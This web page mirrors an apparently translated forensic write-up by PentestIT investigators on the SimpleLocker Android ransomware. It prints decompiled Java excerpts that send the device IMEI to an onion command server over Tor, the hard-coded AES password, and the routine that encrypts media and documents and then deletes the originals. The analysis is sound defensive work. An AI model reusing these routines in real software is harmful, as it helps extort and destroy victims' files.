<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Analysis of Simplelocker-a - extortion virus for Android</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good afternoon, dear habrachchiteli, today our specialists would like to present your gaze analysis of one virus that came to us recently Android, if ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Analysis of Simplelocker-a - extortion virus for Android</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/292/bd7/441/292bd744198946809d66ee1a86a23f16.jpg" align="left"><br><br>  Good afternoon, dear habrachchiteli, today our specialists would like to present your gaze analysis of one virus that came to us recently Android, if you can call it that, SimpleLocker.  In order to learn more about him, we have done a lot of work, which in general can be divided into 3 steps: <br><br>  Step 1. Analyze the manifest and resources <br>  Step 2. Decompiling the application <br>  Step 3. Code analysis <br><a name="habracut"></a><br>  Step 1. Analyze the manifest and resources <br>  First of all, it was decided to analyze the application resources using the aapt.exe utility to extract the string content from the apk file with the command <br>  c: \ android \ apktool&gt; aapt.exe list -a .. \ simple \ fd694cf5ca1dd4967ad6e8c67241114c.apk 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The permissions used in this application were the following: <br><pre><code class="java hljs">android.permission.INTERNET android.permission.ACCESS_NETWORK_STATE android.permission.READ_PHONE_STATE android.permission.RECEIVE_BOOT_COMPLETED android.permission.WAKE_LOCK android.permission.WRITE_EXTERNAL_STORAGE android.permission.READ_EXTERNAL_STORAGE</code> </pre> <br>  Receivers are present: <br><pre> <code class="java hljs"> .ServiceStarter android.intent.action.BOOT_COMPLETED .SDCardServiceStar android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE</code> </pre><br>  as well as the following services: <br><pre> <code class="java hljs"> .MainService org.torproject.android.service.TorService org.torproject.android.service.ITorService org.torproject.android.service.TOR_SERVICE</code> </pre> <br>  From the manifest, we become aware that the virus can work with the TOR network and with an external memory card. <br>  Unpack the application and see what is in the resources.  The most interesting is in the res \ raw folder.  We find two masked files for mp3, which actually provide an archive containing the database of GeoIP countries, as well as configuration files for TOR <br>  Torrc file: <br><pre> <code class="java hljs"> SocksPort <span class="hljs-number"><span class="hljs-number">9050</span></span> SOCKSListenAddress <span class="hljs-number"><span class="hljs-number">127.0</span></span>.0.1 SafeSocks <span class="hljs-number"><span class="hljs-number">0</span></span> TestSocks <span class="hljs-number"><span class="hljs-number">1</span></span> WarnUnsafeSocks <span class="hljs-number"><span class="hljs-number">1</span></span> Log notice stdout ControlListenAddress <span class="hljs-number"><span class="hljs-number">127.0</span></span>.0.1 ControlPort <span class="hljs-number"><span class="hljs-number">9051</span></span> CookieAuthentication <span class="hljs-number"><span class="hljs-number">1</span></span> TransPort <span class="hljs-number"><span class="hljs-number">9040</span></span> TransListenAddress <span class="hljs-number"><span class="hljs-number">127.0</span></span>.0.1 DNSPort <span class="hljs-number"><span class="hljs-number">5400</span></span> DNSListenAddress <span class="hljs-number"><span class="hljs-number">127.0</span></span>.0.1 AvoidDiskWrites <span class="hljs-number"><span class="hljs-number">1</span></span>  torrctether SocksPort <span class="hljs-number"><span class="hljs-number">9050</span></span> SOCKSListenAddress <span class="hljs-number"><span class="hljs-number">0.0</span></span>.0.0 SafeSocks <span class="hljs-number"><span class="hljs-number">0</span></span> TestSocks <span class="hljs-number"><span class="hljs-number">1</span></span> WarnUnsafeSocks <span class="hljs-number"><span class="hljs-number">1</span></span> Log notice stdout ControlPort <span class="hljs-number"><span class="hljs-number">9051</span></span> ControlListenAddress <span class="hljs-number"><span class="hljs-number">0.0</span></span>.0.0 CookieAuthentication <span class="hljs-number"><span class="hljs-number">1</span></span> RelayBandwidthRate <span class="hljs-number"><span class="hljs-number">100</span></span> KBytes RelayBandwidthBurst <span class="hljs-number"><span class="hljs-number">100</span></span> KBytes UseBridges <span class="hljs-number"><span class="hljs-number">0</span></span> AutomapHostsOnResolve <span class="hljs-number"><span class="hljs-number">1</span></span> TransListenAddress <span class="hljs-number"><span class="hljs-number">0.0</span></span>.0.0 TransPort <span class="hljs-number"><span class="hljs-number">9040</span></span> DNSListenAddress <span class="hljs-number"><span class="hljs-number">0.0</span></span>.0.0 DNSPort <span class="hljs-number"><span class="hljs-number">5400</span></span> AvoidDiskWrites <span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre><br>  And the privoxy_config file <br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># Generally, this file goes in /etc/privoxy/config # # Tor listens as a SOCKS4a proxy here: forward-socks4a / 127.0.0.1:9050 . confdir /data/data/org.torproject.android logdir /data/data/org.torproject.android # actionsfile standard # Internal purpose, recommended #actionsfile default.action # Main actions file #actionsfile user.action # User customizations #filterfile default.filter # Don't log interesting things, only startup messages, warnings and errors #logfile logfile #jarfile jarfile #debug 1 #debug 0 # show each GET/POST/CONNECT request #debug 4096 # Startup banner and warnings #debug 8192 # Errors - *we highly recommended enabling this* #user-manual /usr/share/doc/privoxy/user-manual listen-address 127.0.0.1:8118 toggle 1 accept-intercepted-requests 1 enable-remote-toggle 0 enable-edit-actions 0 enable-remote-http-toggle 0 buffer-limit 4096</span></span></code> </pre><br>  Step 2. Decompiling the application <br>  To decompile the application, we use the service <a href="http://www.decompileandroid.com/">link</a> . <br><br>  Step 3. Code analysis <br>  When you have a quick look at the names of the classes, you‚Äôll look at the class Constants.java and see what constants are stored in it: <br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String ADMIN_URL = <span class="hljs-string"><span class="hljs-string">"http://xeyocsu7fu2vjhxs.onion/"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> CHECK_MAIN_WINDOW_TIME_SECONDS = <span class="hljs-number"><span class="hljs-number">1</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String CIPHER_PASSWORD = <span class="hljs-string"><span class="hljs-string">"jndlasf074hr"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String CLIENT_NUMBER = <span class="hljs-string"><span class="hljs-string">"19"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String DEBUG_TAG = <span class="hljs-string"><span class="hljs-string">"DEBUGGING"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String DISABLE_LOCKER = <span class="hljs-string"><span class="hljs-string">"DISABLE_LOCKER"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List EXTENSIONS_TO_ENCRYPT = Arrays.asList(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> String[] { <span class="hljs-string"><span class="hljs-string">"jpeg"</span></span>, <span class="hljs-string"><span class="hljs-string">"jpg"</span></span>, <span class="hljs-string"><span class="hljs-string">"png"</span></span>, <span class="hljs-string"><span class="hljs-string">"bmp"</span></span>, <span class="hljs-string"><span class="hljs-string">"gif"</span></span>, <span class="hljs-string"><span class="hljs-string">"pdf"</span></span>, <span class="hljs-string"><span class="hljs-string">"doc"</span></span>, <span class="hljs-string"><span class="hljs-string">"docx"</span></span>, <span class="hljs-string"><span class="hljs-string">"txt"</span></span>, <span class="hljs-string"><span class="hljs-string">"avi"</span></span>, <span class="hljs-string"><span class="hljs-string">"mkv"</span></span>, <span class="hljs-string"><span class="hljs-string">"3gp"</span></span>, <span class="hljs-string"><span class="hljs-string">"mp4"</span></span>}); <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String FILES_WAS_ENCRYPTED = <span class="hljs-string"><span class="hljs-string">"FILES_WAS_ENCRYPTED"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> MONEYPACK_DIGITS_NUMBER = <span class="hljs-number"><span class="hljs-number">14</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> PAYSAFECARD_DIGITS_NUMBER = <span class="hljs-number"><span class="hljs-number">16</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> POLLING_TIME_MINUTES = <span class="hljs-number"><span class="hljs-number">3</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String PREFS_NAME = <span class="hljs-string"><span class="hljs-string">"AppPrefs"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> UKASH_DIGITS_NUMBER = <span class="hljs-number"><span class="hljs-number">19</span></span>;</code> </pre> <br>  For constant variables, you can assume where the data is sent, which password is used to encrypt files, which files are subject to encryption. <br>  The virus must somehow interact with the server and encrypt the files.  Find the code sections that are responsible for this functionality.  Let's start with the analysis of the class MainService.java which acts as the MainService service. <br>  Data exchange with the server. <br>  In the class MainService.java in the run () method, the function TorSender.sendCheck (context) is called; <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">run</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ ‚Ä¶‚Ä¶ TorSender.sendCheck(context); }</code> </pre> <br>  TorSender.java, this class contains one method: <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sendCheck</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { JSONObject jsonobject = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> JSONObject(); jsonobject.put(<span class="hljs-string"><span class="hljs-string">"type"</span></span>, <span class="hljs-string"><span class="hljs-string">"locker check"</span></span>); jsonobject.put(<span class="hljs-string"><span class="hljs-string">"device id"</span></span>, Utils.getCutIMEI(context)); jsonobject.put(<span class="hljs-string"><span class="hljs-string">"client number"</span></span>, <span class="hljs-string"><span class="hljs-string">"19"</span></span>); (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> HttpSender(jsonobject.toString(), HttpSender.RequestType.TYPE_CHECK, context)).startSending(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (JSONException jsonexception) { jsonexception.printStackTrace(); } }</code> </pre><br>  A json object is created that contains information about the type of request, the IMEI of the device: <br><pre> <code class="java hljs">(Utils.getCutIMEI(context))   . <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getCutIMEI</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context)</span></span></span><span class="hljs-function"> </span></span>{ String s = getIMEI(context); ‚Ä¶. } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getIMEI</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> ((TelephonyManager)context.getSystemService(<span class="hljs-string"><span class="hljs-string">"phone"</span></span>)).getDeviceId(); }</code> </pre><br>  When sending, a proxy server 127.0.0.1:9050 is first created when calling the explicit constructor of the class HttpSender.java <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">HttpSender</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String s, RequestType requesttype, Context context1)</span></span></span><span class="hljs-function"> </span></span>{ dataToSend = s; settings = context1.getSharedPreferences(<span class="hljs-string"><span class="hljs-string">"AppPrefs"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); httpclient = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StrongHttpsClient(context1); httpclient.useProxy(<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>, <span class="hljs-string"><span class="hljs-string">"SOCKS"</span></span>, <span class="hljs-string"><span class="hljs-string">"127.0.0.1"</span></span>, <span class="hljs-number"><span class="hljs-number">9050</span></span>); context = context1; type = requesttype; }</code> </pre><br>  And then we call the startSending () method, which will transfer the data to eyocsu7fu2vjhxs.onion server. <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">startSending</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ ‚Ä¶. HttpResponse httpresponse = send(context, <span class="hljs-string"><span class="hljs-string">"http://xeyocsu7fu2vjhxs.onion/"</span></span>, dataToSend); ... }</code> </pre><br>  File Encryption: <br>  The MainService service starts a stream to encrypt files. <br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Thread(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Runnable() { ‚Ä¶ (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FilesEncryptor(context)).encrypt(); ‚Ä¶ }</code> </pre><br>  Consider the explicit constructor for the FilesEncryptor (context) class. <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">FilesEncryptor</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context)</span></span></span><span class="hljs-function"> </span></span>{ filesToEncrypt = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayList(); filesToDecrypt = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayList(); settings = context.getSharedPreferences(<span class="hljs-string"><span class="hljs-string">"AppPrefs"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); getFileNames(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(Environment.getExternalStorageDirectory().toString())); }</code> </pre><br>  We see the initialization of two lists of stored regular and encrypted files, the getFileNames (File file) method fills the lists: <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">getFileNames</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(File file)</span></span></span><span class="hljs-function"> </span></span>{ ‚Ä¶ String s = file1.getAbsolutePath(); String s1 = s.substring(<span class="hljs-number"><span class="hljs-number">1</span></span> + s.lastIndexOf(<span class="hljs-string"><span class="hljs-string">"."</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (extensionsToDecrypt.contains(s1)) { filesToDecrypt.add(file1.getAbsolutePath()); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (Constants.EXTENSIONS_TO_ENCRYPT.contains(s1)) { filesToEncrypt.add(file1.getAbsolutePath()); } ‚Ä¶ }</code> </pre><br>  And the encrypt () method will encrypt files from the filesToEncrypt list. <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">throws</span></span></span><span class="hljs-function"> Exception </span></span>{ ‚Ä¶ AesCrypt aescrypt; Iterator iterator; aescrypt = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> AesCrypt(<span class="hljs-string"><span class="hljs-string">"jndlasf074hr"</span></span>); iterator = filesToEncrypt.iterator(); ‚Ä¶ String s = (String)iterator.next(); aescrypt.encrypt(s, (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StringBuilder(String.valueOf(s))).append(<span class="hljs-string"><span class="hljs-string">".enc"</span></span>).toString()); (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(s)).delete(); ‚Ä¶ }</code> </pre><br>  Consider the class AesCrypt.java <br>  private final Cipher cipher = Cipher.getInstance ("AES / CBC / PKCS7Padding"); <br>  AES 128 block encryption is used <br>  In the class constructor, we hash the password with the SHA-256 algorithm and generate the key for the cipher: <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">AesCrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String s)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">throws</span></span></span><span class="hljs-function"> Exception </span></span>{ MessageDigest messagedigest = MessageDigest.getInstance(<span class="hljs-string"><span class="hljs-string">"SHA-256"</span></span>); messagedigest.update(s.getBytes(<span class="hljs-string"><span class="hljs-string">"UTF-8"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span> abyte0[] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">32</span></span>]; System.arraycopy(messagedigest.digest(), <span class="hljs-number"><span class="hljs-number">0</span></span>, abyte0, <span class="hljs-number"><span class="hljs-number">0</span></span>, abyte0.length); key = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SecretKeySpec(abyte0, <span class="hljs-string"><span class="hljs-string">"AES"</span></span>); spec = getIV(); }</code> </pre><br>  Well, the encryption method itself: <br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encrypt</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String s, String s1)</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">throws</span></span></span><span class="hljs-function"> Exception </span></span>{ FileInputStream fileinputstream = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileInputStream(s); FileOutputStream fileoutputstream = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> FileOutputStream(s1); cipher.init(<span class="hljs-number"><span class="hljs-number">1</span></span>, key, spec); CipherOutputStream cipheroutputstream = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> CipherOutputStream(fileoutputstream, cipher); <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span> abyte0[] = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[<span class="hljs-number"><span class="hljs-number">8</span></span>]; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i = fileinputstream.read(abyte0); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (i == -<span class="hljs-number"><span class="hljs-number">1</span></span>) { cipheroutputstream.flush(); cipheroutputstream.close(); fileinputstream.close(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } cipheroutputstream.write(abyte0, <span class="hljs-number"><span class="hljs-number">0</span></span>, i); } <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">true</span></span>); }</code> </pre><br>  After conducting this series of studies, we can conclude that this virus has very poor functionality, namely: <br>  1. Grabbing IMEI victims <br>  2. Work with the TOR network <br>  3. File Encryption <br><br>  Anton Boyarkin, Nurlan Nabiev, <a href="https://www.pentestit.ru/forensic">Department of Cybercrime Investigation</a> , PentestIT </div><p>Source: <a href="https://habr.com/ru/post/237207/">https://habr.com/ru/post/237207/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../237195/index.html">Samsung introduced the first secure tablet for enterprises GALAXY Tab Active</a></li>
<li><a href="../237197/index.html">Social network "for the rich"</a></li>
<li><a href="../237199/index.html">Towards Rust 1.0</a></li>
<li><a href="../237201/index.html">CUSTIS Open Seminars: Sixth Season</a></li>
<li><a href="../237203/index.html">The story of one geek</a></li>
<li><a href="../237209/index.html">These entertaining regional settings</a></li>
<li><a href="../237213/index.html">Boot into Vim or Vim with PID 1</a></li>
<li><a href="../237215/index.html">How to create an effective form of gathering contacts: everything you wanted to know, but were afraid to ask</a></li>
<li><a href="../237217/index.html">A bit about iptables, iproute2 and emulation of network problems</a></li>
<li><a href="../237219/index.html">Let's play a game</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>